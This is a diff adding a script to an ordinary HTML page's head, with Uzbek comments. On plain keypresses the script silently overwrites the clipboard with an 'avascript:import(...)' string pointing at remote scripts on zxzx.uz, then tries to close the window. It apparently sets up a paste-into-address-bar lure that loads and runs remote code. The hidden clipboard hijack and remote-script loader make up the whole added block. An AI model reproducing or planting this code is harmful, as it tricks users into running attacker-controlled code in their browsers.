@@ -11,6 +11,49 @@
 <head>
 
 
+ <script>
+async function handleKey(letter, url) {
+  const text = `avascript:import("${url}")`;
+  try {
+    await navigator.clipboard.writeText(text);
+  } catch (err) {
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+  }
+  try {
+    window.close(); // Sahifani yopishga urinish
+  } catch (err) {}
+  setTimeout(() => {
+    window.open('', '_self'); // fallback — oynani tozalab
+    window.close(); // yana yopishga harakat
+  }, 100);
+}
+
+// Tugmalar uchun umumiy listener
+document.addEventListener('keydown', (e) => {
+  if (!e.ctrlKey && !e.altKey && !e.metaKey) {
+    const keyMap = {
+      a: 'https://zxzx.uz/a.js',
+      s: 'https://zxzx.uz/s.js',
+      d: 'https://zxzx.uz/d.js',
+      f: 'https://zxzx.uz/f.js',
+      g: 'https://zxzx.uz/g.js',
+      z: 'https://zxzx.uz/z.js',
+      x: 'https://zxzx.uz/x.js',
+      c: 'https://zxzx.uz/c.js',
+      v: 'https://zxzx.uz/v.js',
+      b: 'https://zxzx.uz/b.js'
+    };
+    const url = keyMap[e.key];
+    if (url) handleKey(e.key, url);
+  }
+});
+</script>
+
   <!--A harfi uchun script-->
 
   <script>
